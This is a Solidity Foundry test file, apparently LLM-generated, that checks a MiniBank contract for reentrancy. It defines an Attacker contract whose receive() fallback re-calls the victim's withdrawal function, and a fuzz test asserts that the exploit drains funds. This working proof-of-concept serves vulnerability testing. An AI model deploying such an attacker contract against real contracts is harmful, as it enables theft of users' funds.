// Generation Time: 30,73s
// Input Tokens: 3344
// Output Tokens: 1293
// Reasoning Tokens: 2294


// SPDX-License-Identifier: MIT
pragma solidity 0.8.29;

import {Test} from "../lib/forge-std/src/Test.sol";
import {MiniBank} from "../src/MiniBank.sol";

// ═══════════════════════════════════════════════════════════════════════════════
// [Testing Goal] Prove that execution control can be hijacked to perform
// recursive calls, thereby breaking the intended atomicity of a sensitive method.
// ═══════════════════════════════════════════════════════════════════════════════

contract TestReentrancyMiniBank is Test {
    
    // ─────────────────────────────────────────────────────────────────────────
    // [Setup] Declare the contract under test and the malicious attacker contract.
    // ─────────────────────────────────────────────────────────────────────────

    MiniBank public _contractUnderTest;
    
    Attacker public _attacker;

    // ─────────────────────────────────────────────────────────────── [/Setup]

    function setUp() public {
        // ─────────────────────────────────────────────────────────────────────
        // [Setup] Initialize the victim contract and the attacker contract.
        // ─────────────────────────────────────────────────────────────────────

        _contractUnderTest = new MiniBank();

        _attacker = new Attacker(address(_contractUnderTest));

        // ───────────────────────────────────────────────────────── [/Setup]
    }

    function test_attackerCallsMultipleTimes(uint256 attackVal) public {
        
        // ─────────────────────────────────────────────────────────────────────
        // [Setup] Constrain Fuzz/Symbolic values and configure pre-conditions.
        // ─────────────────────────────────────────────────────────────────────

        vm.assume(attackVal > 0.01 ether && attackVal < type(uint128).max);

        // ───────────────────────────────────────────────────────── [/Setup]
        // ─────────────────────────────────────────────────────────────────────
        // [Action] Fund contracts using vm.deal and trigger the attack sequence.
        // ─────────────────────────────────────────────────────────────────────

        // A. Fund the Victim (so it has ETH to steal)
        vm.deal(address(_contractUnderTest), attackVal * 10); 
        
        // B. Fund the Attacker
        vm.deal(address(_attacker), attackVal * 2);

        // C. CRITICAL: Fund the Test Contract (address(this))
        vm.deal(address(this), attackVal * 2);

        _attacker.setupAttack{value: attackVal}(attackVal);
        _attacker.attack(attackVal);

        // ──────────────────────────────────────────────────────────── [/Action]

        // ─────────────────────────────────────────────────────────────────────
        // [Assertion] Validate that the exploit succeeded. The exploitSucceeded
        // flag is most commonly set when reentrancyCount > 1, but may also
        // incorporate additional contract-specific conditions (e.g., balance
        // drained beyond expected, state variables corrupted). This provides
        // deterministic, trace-based verification that the intermediate state
        // σ_i was reached and the contract's control flow was manipulated.
        // ─────────────────────────────────────────────────────────────────────────

        assertTrue(_attacker.exploitSucceeded(), "Reentrancy attack failed: exploitSucceeded flag was not set.");

        // ─────────────────────────────────────────────────────── [/Assertion]
    }

    // Keep this so the test contract can receive Ether from the contract being tested on the "positive" scenario
    receive() external payable {}
}

// ═══════════════════════════════════════════════════════════════════════════════
// [Setup] The LLM generates a malicious attacker contract (e.g., ExploitContract)
// that tracks the number of re-entries using a dedicated state variable
// (reentrancyCount).
// ═══════════════════════════════════════════════════════════════════════════════

contract Attacker {
    MiniBank public _victim;
    
    // [Setup] Dedicated state variable to track the number of re-entries.
    uint256 public reentrancyCount;
    bool public exploitSucceeded;

    constructor(address victimAddress) { 
        _victim = MiniBank(victimAddress);
    }

    // ═══════════════════════════════════════════════════════════════ [/Setup]

    // ─────────────────────────────────────────────────────────────────────────
    // [Setup] Prepare the attacker's initial state (e.g., deposit into victim).
    // ─────────────────────────────────────────────────────────────────────────

    function setupAttack(uint256 val) public payable {
        reentrancyCount = 0;
        exploitSucceeded = false;
        
        _victim.receiveCurrency{value: val}();
    }

    // ───────────────────────────────────────────────────────────── [/Setup]

    // ─────────────────────────────────────────────────────────────────────────
    // [Action] Initiate the exploit by calling the victim's vulnerable function.
    // ─────────────────────────────────────────────────────────────────────────

    function attack(uint256 val) public {
        _victim.sendCurrency();

        // [Assertion] Set exploitSucceeded based on the success condition.
        if (reentrancyCount > 1) { 
            exploitSucceeded = true; 
        }
    }

    // ──────────────────────────────────────────────────────── [/Action]

    // ─────────────────────────────────────────────────────────────────────────
    // [Callback Logic] Within receive()/fallback(), re-invoke the victim's
    // vulnerable method. Increment reentrancyCount upon each successful entry
    // to provide a trace-based proof of the exploit.
    // ─────────────────────────────────────────────────────────────────────────

    receive() external payable {
        reentrancyCount++;
        if (reentrancyCount < 2) {
            _victim.sendCurrency();
        }
    }

    // ─────────────────────────────────────────────────── [/Callback Logic]
}
